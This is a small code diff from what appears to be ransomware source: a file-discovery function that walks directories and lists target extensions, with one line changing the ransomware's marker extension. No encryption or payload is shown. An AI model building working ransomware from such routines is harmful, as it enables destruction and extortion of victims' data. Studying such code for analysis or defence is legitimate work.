@@ -42,7 +42,7 @@ def discoverFiles(startpath):
 
         'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
 
-        'wasted', # ransomware extension
+        'ransomeware', # ransomware extension
     ]
 
     for dirpath, dirs, files in os.walk(startpath):
